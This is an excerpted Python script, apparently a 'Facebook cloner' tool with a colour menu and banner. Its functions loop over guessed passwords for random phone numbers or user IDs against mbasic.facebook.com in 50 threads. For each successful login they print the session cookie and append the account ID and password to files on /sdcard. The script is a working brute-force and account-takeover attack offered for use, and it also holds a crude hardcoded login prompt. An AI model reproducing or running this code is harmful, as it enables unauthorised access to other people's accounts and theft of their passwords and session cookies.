...
def menu_apikey():
  ...
  os.system(" xdg-open https://github.com/Evanmahmud143")                          
logo=("""\033[1;32m   _____ _    _          __  __ _____ __  __ 

___________                      ____  ___
\_   _____/__  _______    ____   \   \/  /
 |    __)_\  \/ /\__  \  /    \   \     / 
 |        \\   /  / __ \|   |  \  /     \ 
/_______  / \_/  (____  /___|  / /___/\  \
        \/            \/     \/        \_/
...
time.sleep(0.5)
CorrectUsername = "Fuck Your Gf"
CorrectPassword = "Fuck"
username = input("\033[1;37mEnter the  username: ")
time.sleep(0.2)
password = input("\033[1;37mEnter the  password: ")
time.sleep(0.2)
...
def Main():
	os.system('clear')
	print(logo)
	print('\033[1;32m[1] RANDOM CLONER ')
	print('\033[1;32m[2] RANDOM UID CLONER')
	print('\033[1;32m[3] Follow Facebook')
	print('\033[1;32m[4] JOIN MY FACEBOOK GROUP')
	print('\033[1;32m[5] FOLLOW MY GITHUB ACCOUNT')
	...
	if opt =='2':
		virus3()
	if opt =='3':
		os.system("xdg-open https://facebook.com/groups/1968666653471455/")
	if opt =='4':
		os.system('xdg-open https://facebook.com/groups/1968666653471455/')	
	elif opt =='5':
		os.system('xdg-open https://github.com/Evanmahmud143')
...
def virus():
	...
	doamin = ' 1.5.7 '
	limit = int(input('[?] Enter Your Limited : '))
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print(f' []\033[1;32m target sim code :\033[1;32m{kode} ')
		print(f"\033[1;32m [] version:\033[1;32m{doamin}")
		print('\033[\033[1;32m [] The process has been started')
		print(' []\033[1;32m Turn ON/OF Fight Mode in Every Min  ')
		print(50*'_')
		for guru in user:
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;37mSHAMIM\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\033[1;35m  [SHAMIM-CYBER-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\33[1;92m [🔢] Numer : {uid}')
                print(f'\033[1;37m[♥] COOKIE : '+coki)
                open('/sdcard/SHAMIM-CYBER-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSHAMIM\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;35m[Evan-X OK😘] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\33[1;92m [🔢] Number : {uid}')
                print(f'\033[1;37m[🍪] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/EVAN-X OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def c(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mEVAN\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/Evan.txt', 'a').write(cid+' | '+ps+'\n')
                break
            else:
                continue
        loop+=1        
